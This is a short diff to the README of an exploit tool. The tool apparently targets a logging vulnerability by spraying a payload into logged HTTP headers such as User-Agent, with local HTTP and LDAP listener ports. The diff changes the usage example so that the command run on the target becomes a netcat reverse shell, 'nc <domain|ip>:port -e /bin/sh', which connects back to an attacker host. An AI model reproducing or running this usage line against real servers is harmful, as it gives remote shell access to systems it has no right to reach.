@@ -6,7 +6,7 @@ fully independent exploit does not require any 3rd party binaries.
 The exploit spraying the payload to all possible logged HTTP Headers such as `X-Forwarding , Server-IP , User-Agent` 
 ### Usage
 ```shell
-python main.py -i lhost -u http://target:targetport -c "command_to_execute" -p lhttp_port -l lldap_port
+python main.py -i lhost -u http://target:targetport -c "nc <domain|ip>:port -e /bin/sh" -p lhttp_port -l lldap_port
  ```
 
 
